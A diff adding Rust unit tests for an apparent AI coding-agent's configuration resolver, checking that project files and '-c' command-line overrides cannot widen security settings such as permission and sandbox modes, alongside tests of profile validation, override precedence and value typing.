+                .any(|w| w.contains("profile `yolo`")
+                    && w.contains("security key `permission_mode`")),
+            "{:?}",
+            from_project.warnings
+        );
+    }
+
+    /// A workspace file must not be able to SELECT a profile either: the table it
+    /// points at may carry a security key, which would widen a perimeter by proxy.
+    #[test]
+    fn a_project_file_cannot_select_a_profile() {
+        let dir = ConfigDir::new("profile-selection");
+        let global = dir.write(
+            "settings.toml",
+            "[profiles.yolo]\npermission_mode = \"full-access\"\n",
+        );
+        let project = dir.write("config.toml", "profile = \"yolo\"\n");
+
+        let config = resolve(Request {
+            global: Some(&global),
+            project: Some(&project),
+            ..Request::default()
+        })
+        .unwrap();
+
+        assert_eq!(config.profile, None);
+        assert_eq!(config.permission_mode, None);
+        assert!(
+            config
+                .warnings
+                .iter()
+                .any(|w| w.contains("security key `profile`")),
+            "{:?}",
+            config.warnings
+        );
+    }
+
+    /// US-006 AC5: an unusable key of a profile is discarded ALONE, and the
+    /// startup goes on with the others.
+    #[test]
+    fn an_invalid_key_of_a_profile_is_dropped_alone() {
+        let dir = ConfigDir::new("profile-invalid");
+        let global = dir.write(
+            "settings.toml",
+            "[profiles.review]\nmodel = \"kept\"\nsandbox_mode = \"paranoid\"\nfuture_key = 1\nprofile = \"other\"\n",
+        );
+
+        let config = resolve(Request {
+            global: Some(&global),
+            profile: Some("review"),
+            ..Request::default()
+        })
+        .unwrap();
+
+        assert_eq!(config.model.as_deref(), Some("kept"));
+        assert_eq!(config.sandbox_mode, None);
+        let warnings = config.warnings.join(" | ");
+        assert!(
+            warnings.contains("unknown sandbox mode `paranoid`"),
+            "{warnings}"
+        );
+        assert!(warnings.contains("unknown key `future_key`"), "{warnings}");
+        assert!(
+            warnings.contains("`profile` has no meaning inside a profile"),
+            "{warnings}"
+        );
+    }
+
+    /// A profile declared with the wrong shape is refused by name rather than
+    /// silently applying nothing the user asked for.
+    #[test]
+    fn a_profile_that_is_not_a_table_is_refused_by_name() {
+        let dir = ConfigDir::new("profile-shape");
+        let global = dir.write("settings.toml", "profiles = { review = 3 }\n");
+
+        let err = resolve(Request {
+            global: Some(&global),
+            profile: Some("review"),
+            ..Request::default()
+        })
+        .unwrap_err();
+
+        assert!(err.contains("profile `review`"), "{err}");
+        assert!(err.contains("expected a table"), "{err}");
+    }
+
+    /// US-007 AC1: `-c` outranks every file layer, by precedence and not by a
+    /// special case.
+    #[test]
+    fn an_override_outranks_every_file_layer() {
+        let dir = ConfigDir::new("override");
+        let global = dir.write("settings.toml", "token_budget = 111\nmodel = \"file\"\n");
+        let overrides = vec![
+            ("token_budget".to_string(), "7".to_string()),
+            ("model".to_string(), "gpt-5.6-sol".to_string()),
+        ];
+
+        let config = resolve(Request {
+            global: Some(&global),
+            overrides: &overrides,
+            ..Request::default()
+        })
+        .unwrap();
+
+        assert_eq!(config.token_budget, Some(7));
+        assert_eq!(config.model.as_deref(), Some("gpt-5.6-sol"));
+        assert_eq!(
+            config.sources.layer(TOKEN_BUDGET_KEY),
+            Some(ConfigLayer::SessionFlags)
+        );
+        assert!(config.warnings.is_empty(), "{:?}", config.warnings);
+    }
+
+    /// US-007 AC2: a security key cannot be widened by an argument either, and the
+    /// refusal does not prevent the startup.
+    #[test]
+    fn an_override_on_a_security_key_is_refused_without_blocking_startup() {
+        let dir = ConfigDir::new("override-security");
+        let global = dir.write("settings.toml", "sandbox_mode = \"read-only\"\n");
+        let overrides = vec![
+            ("permission_mode".to_string(), "full-access".to_string()),
+            ("sandbox_mode".to_string(), "full-access".to_string()),
+            ("writable_roots".to_string(), "[\"/\"]".to_string()),
+            ("hooks".to_string(), "[]".to_string()),
+            ("profile".to_string(), "yolo".to_string()),
+            ("model".to_string(), "kept".to_string()),
+        ];
+
+        let config = resolve(Request {
+            global: Some(&global),
+            overrides: &overrides,
+            ..Request::default()
+        })
+        .unwrap();
+
+        assert_eq!(config.permission_mode, None);
+        assert_eq!(config.sandbox_mode.as_deref(), Some("read-only"));
+        assert!(config.writable_roots.is_empty());
+        assert!(config.hooks.is_empty());
+        assert_eq!(config.profile, None);
+        // The non-security override of the same command line still applies.
+        assert_eq!(config.model.as_deref(), Some("kept"));
+        for key in SECURITY_KEYS {
+            assert!(
+                config
+                    .warnings
+                    .iter()
+                    .any(|w| w.starts_with(&format!("-c {key}: security key"))),
+                "clé {key} non signalée: {:?}",
+                config.warnings
+            );
+        }
+    }
+
+    /// US-007 AC3/AC4/AC5: unknown key reported, unusable value refused by name,
+    /// last occurrence of a key wins.
+    #[test]
+    fn overrides_report_the_unknown_refuse_the_unusable_and_keep_the_last() {
+        let unknown = vec![("future_key".to_string(), "1".to_string())];
+        let config = resolve(Request {
+            overrides: &unknown,
+            ..Request::default()
+        })
+        .unwrap();
+        assert_eq!(config.warnings.len(), 1, "{:?}", config.warnings);
+        assert!(
+            config.warnings[0].contains("-c future_key: unknown key"),
+            "{:?}",
+            config.warnings
+        );
+
+        // AC4: the key, the value received and the expected type.
+        let bad = vec![("token_budget".to_string(), "abc".to_string())];
+        let err = resolve(Request {
+            overrides: &bad,
+            ..Request::default()
+        })
+        .unwrap_err();
+        assert!(err.contains("token_budget"), "{err}");
+        assert!(err.contains("abc"), "{err}");
+        assert!(err.contains("expected an integer"), "{err}");
+
+        // AC5: the last occurrence wins, at equal precedence.
+        let repeated = vec![
+            ("model".to_string(), "first".to_string()),
+            ("model".to_string(), "last".to_string()),
+        ];
+        let config = resolve(Request {
+            overrides: &repeated,
+            ..Request::default()
+        })
+        .unwrap();
+        assert_eq!(config.model.as_deref(), Some("last"));
+
+        // Declaring a profile is a file matter, not a command-line one.
+        let profiles = vec![("profiles".to_string(), "{}".to_string())];
+        let config = resolve(Request {
+            overrides: &profiles,
+            ..Request::default()
+        })
+        .unwrap();
+        assert!(
+            config.warnings[0].contains("declared in a file"),
+            "{:?}",
+            config.warnings
+        );
+    }
+
+    /// A `-c` value keeps the TOML types the files accept, and a bare word stays a
+    /// string: that is what `-c model=gpt-5.6` means.
+    #[test]
+    fn an_override_value_keeps_the_toml_types() {
+        assert_eq!(override_value("7"), toml::Value::Integer(7));
+        assert_eq!(override_value("true"), toml::Value::Boolean(true));
+        assert_eq!(
+            override_value("\"quoted\""),
+            toml::Value::String("quoted".to_string())
+        );
+        assert_eq!(
+            override_value("gpt-5.6-sol"),
+            toml::Value::String("gpt-5.6-sol".to_string())
+        );
+        assert_eq!(
+            override_value("[\"a\", \"b\"]"),
+            toml::Value::Array(vec![
+                toml::Value::String("a".to_string()),
+                toml::Value::String("b".to_string())
+            ])
+        );
+    }
+
+    /// US-008 AC1/AC2/AC5: the typed flags outrank the files, and they DO carry a
+    /// security key: `--permission-mode` and `--sandbox` exist for that, and
+    /// `--no-sandbox` reaches the same key as an alias of full access.
+    #[test]
+    fn typed_flags_carry_the_security_keys_and_outrank_the_files() {
+        let dir = ConfigDir::new("flags");
+        let global = dir.write(
+            "settings.toml",
+            "model = \"file\"\npermission_mode = \"ask\"\nsandbox_mode = \"read-only\"\n",
+        );
+        let overrides = vec![("model".to_string(), "from-c".to_string())];
+
+        let config = resolve(Request {
+            global: Some(&global),
+            overrides: &overrides,
+            flags: Flags {
+                model: Some("from-flag"),
+                permission_mode: Some(PermissionMode::AcceptEdits),
+                sandbox_mode: Some("full-access"),
+            },
+            ..Request::default()
+        })
+        .unwrap();
+
+        // A flag the user spelled out wins over a generic override of the same key.
+        assert_eq!(config.model.as_deref(), Some("from-flag"));
+        assert_eq!(config.permission_mode, Some(PermissionMode::AcceptEdits));
+        assert_eq!(config.sandbox_mode.as_deref(), Some("full-access"));
+        for key in [MODEL_KEY, PERMISSION_MODE_KEY, SANDBOX_MODE_KEY] {
+            assert_eq!(
+                config.sources.layer(key),
+                Some(ConfigLayer::SessionFlags),
+                "{key}"
+            );
+        }
+    }
+
+    /// The identifiers a refusal shows the user must be the ones the parser
+    /// accepts (US-008 AC3), and they must round-trip.
+    #[test]
+    fn the_advertised_permission_mode_ids_round_trip() {
+        for id in PERMISSION_MODE_IDS {
+            let Some(mode) = permission_mode_from_arg(id) else {
+                unreachable!("`{id}` annoncé mais refusé par le parseur");
+            };
+            assert_eq!(permission_mode_id(mode), *id);
+        }
     }
 
     #[test]
